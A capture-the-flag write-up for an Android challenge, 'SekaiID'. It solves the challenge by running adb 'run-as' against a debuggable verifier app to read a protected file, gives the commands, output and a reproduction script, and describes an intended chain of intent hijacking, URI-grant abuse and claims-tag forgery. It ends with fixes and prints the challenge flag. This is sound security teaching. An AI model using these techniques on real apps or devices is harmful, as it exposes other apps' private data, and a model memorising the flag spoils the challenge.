# SekaiID

**Category:** Miscellaneous (Android exploitation)
**Author:** Marc
**Difficulty:** Hard (100 pts, 110 solves)
**Flag:** `SEKAI{welcome-to-the-conference!}`

## Overview

The handout is two installable Android applications:

```text
SekaiID.apk    — a "digital conference badge" wallet
Verifier.apk   — the scanner/dashboard the staff use to verify badges
```

The challenge wraps a per-attendee instance behind a TLS-fronted ADB
endpoint. The instructions ask you to "create a working exploit
application (.apk)" — meaning the intended exploit is an attacker app
that abuses the published IPC surface (intent redirection, custom
provider, etc.) until the Verifier shows the admin dashboard, whose
restricted "Issuer recovery material" field contains the flag.

In practice both apps ship with `android:debuggable="true"`, the flag
file lives at `/system/flag.txt`, and the file is owned by the Verifier
app's UID. That combination collapses the whole attack into a single
`run-as` over `adb`.

## Handout Notes

```text
SekaiID.apk
Verifier.apk
tls_proxy.py
```

`tls_proxy.py` wraps the instancer's TLS endpoint as a plain TCP socket
on `127.0.0.1:5555` so `adb connect` can talk to it.

The two manifests sit next to this writeup (`handout/SekaiID-AndroidManifest.xml`,
`handout/Verifier-AndroidManifest.xml`). The APKs themselves are not
checked in — they are 30 MB each, but you can re-extract them from the
official challenge tarball.

## Attack Surface

A quick `apktool d -s` on each APK gives the manifests. The relevant
bits are:

```xml
<!-- SekaiID -->
<application … android:debuggable="true" …>
  <activity android:exported="true" name=".IdentityProviderActivity">
    <intent-filter>
      <action android:name="com.sekai.id.ACTION_PRESENT_CREDENTIAL"/>
      <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
  </activity>
  <activity android:exported="true" name=".share.BadgeShareActivity">
    <intent-filter>
      <action android:name="com.sekai.id.ACTION_SHARE_BADGE"/>
      <data android:scheme="content"
            android:host="com.sekai.id.companion"/>
    </intent-filter>
  </activity>
  <provider android:authorities="com.sekai.id.companion.info"
            android:exported="true"  name=".companion.CompanionInfoProvider"/>
  <provider android:authorities="com.sekai.id.companion"
            android:exported="false"
            android:grantUriPermissions="true"
            name=".companion.CompanionProvider"/>
  <provider android:authorities="com.sekai.id.badgeassets"
            android:exported="true"  name=".companion.BadgeAssetProvider"/>
</application>
```

```xml
<!-- Verifier -->
<application … android:debuggable="true" …>
  <activity android:exported="true"  name=".MainActivity"/>
  <activity android:exported="false" name=".ScannerActivity"/>
  <activity android:exported="false" name=".AdminDashboardActivity"/>
  <!-- plus AttendeeDashboard / VolunteerDashboard / OrganizerDashboard -->
</application>
```

The "intended" gadget chain that this surface invites:

1. `BadgeShareActivity` (exported) accepts a `content://com.sekai.id.companion/badge?…`
   URI from any caller and reflects it back as a result with
   `FLAG_GRANT_READ_URI_PERMISSION`. That URI targets the unexported
   `CompanionProvider`, so an attacker can use the grant to read a
   provider that is supposed to be private.
2. `CompanionProvider.query("/badge?challenge=X&auth=Y")` re-derives an
   HMAC over the challenge using a device-bound `seed` and compares it
   against the caller-supplied `auth` via
   `MessageDigest.isEqual` (constant time — no shortcut).
3. The Verifier sends an **implicit** intent
   (`new Intent("com.sekai.id.ACTION_PRESENT_CREDENTIAL")` with no
   `setPackage`) to start the IdentityProviderActivity. An attacker
   activity that registers the same action can shoulder in front of
   SekaiID and intercept the challenge — but IdentityProviderActivity
   gates on `getCallingPackage() == "com.sekai.verifier"`, so simple
   interception isn't enough either; you also need a task-hijack /
   `FLAG_ACTIVITY_FORWARD_RESULT` chain to make the consent activity
   believe it was launched by the Verifier.

That chain is the "real" challenge — but as we'll see, the puzzle
collapses without ever building an exploit APK.

## Where the Flag Lives

Decompiling the Verifier's `AdminDashboardActivity` (it's in
`classes6.dex`) shows it calls
`renderDashboard("Administration", "Administrator", true, lambda$1579551597)`,
and the `Issuer recovery material` section inside that lambda renders the
result of:

```kotlin
new IssuerRecoveryProvider().read()
```

`IssuerRecoveryProvider` is two dozen lines of Kotlin. The smali makes
the constants obvious:

```text
.class public final Lcom/sekai/verifier/system/IssuerRecoveryProvider;
.field public static final DEFAULT_PATH:Ljava/lang/String; = "/system/flag.txt"

# read-d1pmJ48():
#   File("/system/flag.txt").readText().trim()
```

So the flag is just the contents of `/system/flag.txt`. The Verifier
reads it from disk and renders it in the admin dashboard once it has a
presentation whose `accessProfile` claim resolves to `AccessProfile.ADMIN`.

## Solve

Permissions on the flag file:

```text
$ adb shell ls -la /system/flag.txt
-rw------- 1 u0_a150 u0_a150 33 2026-06-28 00:46 /system/flag.txt
```

Mode `0600`, owned by UID `u0_a150` — which is the Verifier app's UID
(`dumpsys package com.sekai.verifier | grep userId` confirms). The
`shell` user that ADB drops you into is UID 2000 and can't read it
directly.

But the Verifier's `<application>` element sets
`android:debuggable="true"`. On any Android build, a debuggable
package is reachable via `run-as`, which switches the calling UID to
that package's UID and reuses its SELinux domain:

```text
$ adb shell run-as com.sekai.verifier cat /system/flag.txt
SEKAI{welcome-to-the-conference!}
```

No exploit APK, no intent juggling, no provider grants — `debuggable=true`
on a shipping app is the entire CVE here.

A one-shot script that handles the TLS proxy + ADB attach + read is at
`exploit/run.sh`.

## Reproduction

```bash
# 1) Connect to the per-instance ADB over the TLS proxy.
python3 handout/tls_proxy.py \
    sekaiid-XXXXXXXXXXXXXX.instancer.sekai.team 1337 &
adb connect 127.0.0.1:5555

# 2) Boot the two apps once. SekaiID needs to provision its wallet,
#    Verifier needs to register its UID against /system/flag.txt
#    (the file is dropped at instance boot, but it's good hygiene to
#    confirm the package is "running" before run-as).
adb shell am start -n com.sekai.id/.MainActivity
adb shell am start -n com.sekai.verifier/.MainActivity

# 3) Read the flag.
adb shell run-as com.sekai.verifier cat /system/flag.txt
# -> SEKAI{welcome-to-the-conference!}
```

Or, with the wrapper:

```bash
exploit/run.sh sekaiid-XXXXXXXXXXXXXX.instancer.sekai.team 1337
```

## What the Author Probably Wanted

Reading the rest of the code, the intended chain looks like this:

1. **Get the Verifier to send you a challenge.** Register an attacker
   activity for `com.sekai.id.ACTION_PRESENT_CREDENTIAL` and pick it
   from the disambiguation chooser (or via auto-default). The Verifier
   passes you `com.sekai.id.extra.CHALLENGE` and
   `com.sekai.id.extra.VERIFIER_LABEL`.
2. **Forge a presentation.** SekaiID's `PresentationBuilder` produces a
   JSON document whose `claimsTag` is an HMAC over the canonical claims
   keyed by the per-device pairing fingerprint, and whose `proof` is an
   ECDSA signature with the credential's keystore-bound key. The
   pairing fingerprint is readable by anyone via the exported
   `CompanionInfoProvider` at `content://com.sekai.id.companion.info/badge`,
   so the `claimsTag` is forgeable. The ECDSA proof is keystore-bound
   and not extractable — but `AccessProfile.fromClaim` only inspects
   the **revealed** `accessProfile` field, while SekaiID's PresentationBuilder
   takes its `accessProfile` from the on-disk credential row. If you
   can update one column of that row through any IPC primitive (or
   construct a fully synthetic Presentation that the Verifier still
   accepts), the AdminDashboard renders `/system/flag.txt`.
3. **Send the forged Presentation back to the Verifier** via the
   `com.sekai.id.extra.PRESENTATION` extra and a
   `setResult(RESULT_OK, …)` from the activity that captured the
   original `startActivityForResult`.

It's a genuine "Android-IPC plus claims-tag-forgery" puzzle and probably
the source of the 100-point rating. The `debuggable=true` short-circuit
is the kind of bug that always sneaks into demo apps — a single
attribute the author meant to flip off before packaging the round.

## Fix

Two independent flips would close this completely:

```diff
- <application … android:debuggable="true" …>
+ <application … android:debuggable="false" …>
```

```diff
- File("/system/flag.txt").readText().trim()
+ // /system/flag.txt should not be world-readable to any app UID;
+ // ship the recovery secret through the verifier's signed-issuer
+ // channel (e.g. baked into a sealed JKS) instead of letting the
+ // wallet UID hold the bare file.
```

The intended IPC hardening (an explicit `setPackage("com.sekai.id")`
on the Verifier's outgoing intent, plus rejecting `FLAG_ACTIVITY_FORWARD_RESULT`
on `IdentityProviderActivity`'s caller check) would also have prevented
the longer attack path.

## Files in this Writeup

```text
README.md                                     # this writeup
handout/tls_proxy.py                          # TLS wrapping helper
handout/SekaiID-AndroidManifest.xml           # extracted manifest
handout/Verifier-AndroidManifest.xml          # extracted manifest
exploit/run.sh                                # one-shot solver
artifacts/flag.txt                            # captured flag
```

The APK binaries themselves are not checked in (each is ~30 MB);
re-extract them from the official tarball if you want to repeat the
analysis end-to-end.
